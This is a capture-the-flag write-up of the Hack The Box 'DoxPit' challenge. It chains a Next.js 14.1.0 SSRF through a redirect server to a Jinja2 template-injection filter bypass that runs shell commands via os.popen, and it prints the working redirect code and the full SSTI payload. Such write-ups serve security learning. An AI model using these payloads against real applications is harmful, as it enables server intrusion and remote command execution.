---
title: "Solving DoxPit Challenge"
date: "2024-08-05"
description: "HTB DoxPit challenge walkthrough featuring a mix of vulnerabilities in Flask and NextJS applications. A methodical approach to exploiting web application flaws."
tags: [HTB, CTF, Flask, NextJS, Web Security]
categories: [CTF]
image: https://miro.medium.com/v2/resize:fit:700/1*tWUMuT1J0TUSBua9hOmWcg.png
---

# [HTB] Solving DoxPit Challange



![](https://miro.medium.com/v2/resize:fit:700/1*tWUMuT1J0TUSBua9hOmWcg.png)

In this write-up, I'll walk you through the process of solving the HTB DoxPit challenge

This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, I'll show you how to exploit these vulnerabilities and successfully capture the flag

Let's dive into the details!

# Getting Started

The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.

The Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of  `render_template_string`


```python
# app.py
@web.route("/home", methods=["GET", "POST"])
@auth_middleware
def feed():
  directory = request.args.get("directory")

  if not directory:
    dirs = os.listdir(os.getcwd())
    return render_template("index.html", title="home", dirs=dirs)

  if any(char in directory for char in invalid_chars):
    return render_template("error.html", title="error", error="invalid directory"), 400

  try:
    with open("./application/templates/scan.html", "r") as file:
        template_content = file.read()
        results = scan_directory(directory)
        template_content = template_content.replace("{{ results.date }}", results["date"])
        template_content = template_content.replace("{{ results.scanned_directory }}", results["scanned_directory"])
        return render_template_string(template_content, results=results)

  except Exception as e:
    return render_template("error.html", title="error", error=e), 500
```

However, since this app was running locally, our only access was through the NextJS app, which provided the user interface (UI)

# Identifying the SSRF Vulnerability

I took a look at the  `package.json`  file of the NextJS app and saw that it was using version  `14.1.0`

![](https://miro.medium.com/v2/resize:fit:681/1*dleheh-C-qvDofbc6PZIRA.png)

This version is known to be vulnerable to Server-Side Request Forgery (SSRF) when using the  `redirect`  function from  `next/navigation`

Specifically, I found that the  `doRedirect`  function in  `serverAction.tsx`, which was used in the home page posts links, utilized this function

```js
"use server";

import { redirect } from "next/navigation";

export async function doRedirect() {
  redirect("/error");
}
```


```html
<form action={doRedirect}>
      <button className="link-light" type="submit">{paste.title}</button>
</form>
```

# Exploiting SSRF

To exploit this vulnerability, I began by intercepting requests from the home page using Burp Suite, the goal was to modify the  `Host`  and  `Origin`  headers to point to my server

Before diving into this, I added Burp Collaborator to test if I would receive any requests from the application

This step was crucial to confirm that the application was interacting with my server as expected

![](https://miro.medium.com/v2/resize:fit:700/1*OIhA8_i0n-duq8g0sNJEVA.png)

And yep got it

![](https://miro.medium.com/v2/resize:fit:700/1*vAubxr_uxPh000PCWOZjpg.png)

I then configured Burp Suite to respond with a 302 redirect to  `0.0.0.0:3000`

To test this, I set up a simple Flask application to serve as a local endpoint
```python

# got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io

from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://0.0.0.0:3000')
```

# Accessing the Internal App

After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000

![](https://miro.medium.com/v2/resize:fit:700/1*SuGoOgMNjUgZC0tKqx-joA.png)

The next step was to interact with the application, starting by registering a new account, as the application required registration for further actions

The registration endpoint allowed us to create an account using a simple GET request

```python

@web.route("/register", methods=["GET"])
def register():
  username = request.args.get("username")
  password = request.args.get("password")

  if not username or not password:
    return render_template("register.html", title="register")

  db_session = Database()
  token = generate(16)
  user_valid = db_session.create_user(username, password, token)

  if not user_valid:
    return render_template("error.html", title="error", error="user exists"), 401

  return render_template("error.html", title="success", error=f"User created with token: {token}"), 200
```

So I changed my server to point to  `http://0.0.0.0:3000/register?username=kebda&password=3afroto`

With the account successfully created, the application returned a session token

![](https://miro.medium.com/v2/resize:fit:700/1*RcpX5mpj9R-BJDQ5JzBZ3A.png)

Using this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate:  `http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530`

```python

# auth handling function
def auth_middleware(func):
  def check_user(*args, **kwargs):
    db_session = Database()

    if not session.get("loggedin"):
      if request.args.get("token") and db_session.check_token(request.args.get("token")):
        return func(*args, **kwargs)
      else:
        return redirect("/login")

    return func(*args, **kwargs)

  check_user.__name__ = func.__name__
  return check_user
```

This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D

![](https://miro.medium.com/v2/resize:fit:700/1*4f-kqARPFX3WrKrr-8s5Sw.png)

let's jump into  `directory`  parameter to get this SSTI!

I initially tried common payloads like  `{% raw %}{{1*8}}{% endraw %}`, but these were blocked due to a blacklist filtering out certain characters:(

```python
invalid_chars = ["{% raw %}{{{% endraw %}", "{% raw %}}}{% endraw %}", ".", "_", "[", "]","\\", "x"]

  if any(char in directory for char in invalid_chars):
    return render_template("error.html", title="error", error="invalid directory"), 400
```

![](https://miro.medium.com/v2/resize:fit:700/1*700MrKoEPGKbv9MKkYGzKg.png)

# Bypassing the Blacklist

To bypass this filter, I searched for alternative approaches and found a method in this  [article](https://0day.work/jinja2-template-injection-filter-bypasses/)

The idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter

```

+---------------------------+
|       Main Input          |
|  (Filtered by blacklist)  |
+---------------------------+
            |
            v
+---------------------------+
|       Alternative         |
|        Input Parameter     |
|    (Not filtered)         |
+---------------------------+
            |
            v
+---------------------------+
|   Payload Injection       |
|   (Bypassing the filter)  |
+---------------------------+
            |
            v
+---------------------------+
|       Final Output        |
|  (Executed Command Result)|
+---------------------------+
```


And that's the payload I came with

```html
&#123;%with output=((((request|attr('application'))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;globals&#39;)))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;getitem&#39;)))(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;builtins&#39;))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;getitem&#39;)))(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;import&#39;)))(&#39;os&#39;)|attr(&#39;popen&#39;)(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)(&#39;cmd&#39;))|attr(&#39;read&#39;)()%&#125;&#123;%print(output)%&#125;&#123;%endwith%&#125;&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=

```

To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters

`invalid_chars = ["{% raw %}{{{% endraw %}", "{% raw %}}}{% endraw %}", ".", "_", "[", "]","\\", "x"]`

I replaced blacklisted characters and patterns with alternatives:

-   `{% raw %}{{{% endraw %}`  was replaced with  `{%raw%}{%{%endraw%}`.
-   `{% raw %}}}{% endraw %}`  was replaced with  `%}`.
-   `.`  was bypassed by using attribute chaining through the  `request`  object.
-   `_`  was avoided by using alternative attribute names and methods.
-   `[` and `]`  were substituted with attribute access via  `attr()`.
-   `\\`  and  `x`  were sidestepped by constructing the payload in a way that didn't require these characters.

I navigated through the  `request`  attributes to access Python's  `globals`  and  `builtins`  dictionaries, using the  `import`  function, I imported the  `os`  module and used its  `popen`  method to OS execute commands

And Successfully executed the  `id`  command, confirming root access

```http
http://0.0.0.0:3000/home?token=<>&directory=&#123;%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%&#125;&#123;%print(output)%&#125;&#123;%endwith%&#125;&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id

```


![](https://miro.medium.com/v2/resize:fit:700/1*Xl5B59r9fgJGMBkPuPNcLg.png)

Nice, Root:)

Ran  `ls -lah /`  to list the system files, which revealed the flag's location

![](https://miro.medium.com/v2/resize:fit:695/1*0Kw-zjh-CPKYvW8O7ym5kQ.png)

nice flag is there, lets use  `cat`to read the flag from the file, successfully retrieving it

![](https://miro.medium.com/v2/resize:fit:700/1*TCdBFtrQgv36-ftOkivS8g.png)

![](https://miro.medium.com/v2/resize:fit:700/1*A3zR-rBM2mstqTg5zxvU8w.png)

And That's it

Bye UwU
